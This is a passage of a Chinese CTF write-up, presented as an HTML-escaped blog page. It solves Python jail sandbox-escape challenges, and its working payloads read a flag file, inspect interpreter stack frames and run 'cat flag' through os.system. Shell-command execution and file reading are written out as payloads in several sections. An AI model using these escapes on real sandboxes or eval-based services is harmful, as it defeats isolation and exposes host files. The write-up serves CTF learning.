class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        input_data = eval_func(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;),&amp;#123;&amp;#125;,&amp;#123;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; Exception:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.stdout = challenge_original_stdout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Seems not right! please guess it!&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; game_score&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sys.stdout = challenge_original_stdout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; input_data == right_guesser_question_answer:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        game_score += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; game_score&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;可知我们需要猜出 &lt;code&gt;right_guesser_question_answer&lt;/code&gt;  才可以获取 flag，同时还给 &lt;code&gt;sys.stdout&lt;/code&gt; 、 &lt;code&gt;sys.seterr&lt;/code&gt;  进行了重定向，调用 print 无法输出。&lt;/p&gt;
&lt;p&gt;一些解释：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/MTbaby/article/details/53159053&#34;&gt;python 的 sys.stdout 重定向 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是可以通过 &lt;code&gt;__import__(&amp;quot;sys&amp;quot;).__stdout__.write()&lt;/code&gt;  去输入。&lt;/p&gt;
&lt;p&gt;那么我们的思路就是，读文件，然后输出&lt;/p&gt;
&lt;p&gt;用 os.open 打开文件，然后用 os.read 读文件，当然也可以用 &lt;code&gt;__import__(&#39;io&#39;).open(&amp;quot;flag&amp;quot;).read()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__import__(&amp;quot;sys&amp;quot;).__stdout__.write(__import__(&amp;quot;os&amp;quot;).read(__import__(&amp;quot;os&amp;quot;).open(&amp;quot;flag&amp;quot;,__import__(&amp;quot;os&amp;quot;).O_RDONLY), 0x114).decode())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/08/LWZ5ypkOlGCn3d7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;lak3-lak3-lak3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lak3-lak3-lak3&#34;&gt;#&lt;/a&gt; lak3 lak3 lak3&lt;/h3&gt;
&lt;p&gt;直接把 io、system 之类的函数全给 hook 掉了，还把上一题的 open 等更多的函数给 ban 了&lt;/p&gt;
&lt;p&gt;也是猜数字，答案在 &lt;code&gt;right_guesser_question_answer&lt;/code&gt; ，想办法获取该值&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/08/B16ZFDXtSVz9R3h.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以使用 &lt;code&gt;__import__(&amp;quot;sys&amp;quot;).__stdout__.write&lt;/code&gt;  去进行标准输出，&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__import__(&amp;quot;sys&amp;quot;).__stdout__.write(str(__import__(&amp;#x27;sys&amp;#x27;)._getframe(1)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/08/xqvCfP4M93aW1Uu.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里的 frame 对象指向了’/home/ctf/./server.py’这个 file，那么直接调用 f_locals 属性查看变量&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__import__(&amp;quot;sys&amp;quot;).__stdout__.write(str(__import__(&amp;#x27;sys&amp;#x27;)._getframe(1).f_locals))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/08/1bPN2qLovwr9S5T.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;最终 payload：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int(str(__import__(&amp;#x27;sys&amp;#x27;)._getframe(1).f_locals[&amp;quot;right_guesser_question_answer&amp;quot;]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/08/SL9hMJGDt3C8scq.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;sfe-safeeval&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sfe-safeeval&#34;&gt;#&lt;/a&gt; s@Fe safeeval&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Black &lt;span class=&#34;type&#34;&gt;List&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;POP_TOP&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;ROT_TWO&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;ROT_THREE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;ROT_FOUR&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;DUP_TOP&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;BUILD_LIST&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BUILD_MAP&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BUILD_TUPLE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BUILD_SET&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;BUILD_CONST_KEY_MAP&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;BUILD_STRING&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;LOAD_CONST&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;RETURN_VALUE&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;STORE_SUBSCR&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;STORE_MAP&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;LIST_TO_TUPLE&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;LIST_EXTEND&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;SET_UPDATE&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;DICT_UPDATE&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;DICT_MERGE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;UNARY_POSITIVE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;UNARY_NEGATIVE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;UNARY_NOT&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;UNARY_INVERT&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_POWER&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_MULTIPLY&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_DIVIDE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_FLOOR_DIVIDE&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_TRUE_DIVIDE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_MODULO&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_ADD&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_SUBTRACT&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_LSHIFT&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_RSHIFT&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_AND&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_XOR&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;BINARY_OR&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;MAKE_FUNCTION&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;CALL_FUNCTION&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;some code:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; traceback&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pwnlib.util.safeeval &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; safeeval&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input_data = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(expr(input_data))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;expr&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;n&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; TURING_PROTECT_SAFE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;m = safeeval.test_expr(n, blocklist_codes)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(m)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; safeeval.expr(n)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;对比下 pwnlib.util.safeeval 中的代码，可以看到 blacklist 中多了两个可以执行的 opcode&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MAKE_FUNCTION&lt;br&gt;
CALL_FUNCTION&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很显然出题人想让我们执行函数调用 / 编写。&lt;/p&gt;
&lt;p&gt;第一时间能想到的是 lambda，然后直接调用就行了，payload 为：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(lambda:os.system(&amp;#x27;cat flag&amp;#x27;))()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/09/rqJ3FA4O5Dkp76U.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level6&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level6&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; _                _                           _       _ _   _                _   __  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; | |              (_)                         (_)     (_) | | |              | | / /  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; | &lt;span class=&#34;string&#34;&gt;&amp;#x27;_ \ / _ \/ _` | | &amp;#x27;&lt;/span&gt;_ \| &lt;span class=&#34;string&#34;&gt;&amp;#x27;_ \ / _ \ &amp;#x27;&lt;/span&gt;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | &lt;span class=&#34;string&#34;&gt;&amp;#x27;_ \ &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/ &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;              __/ |                          _/ |                                     &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;             |___/                          |__/                                                                                                                                                              &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Welcome to the python jail&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Let&amp;#x27;&lt;/span&gt;s have an beginner jail of calc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Enter your expression &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; I will evaluate it &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; you.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;White &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; of audit hook ===&amp;gt; builtins.&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;,builtins.&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;/result,&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Some code of python jail:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dict_global = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          input_data = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; EOFError:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; KeyboardInterrupt:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;bye~~&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; input_data == &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          complie_code = &lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;(input_data, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;string&amp;gt;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;single&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; SyntaxError &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; 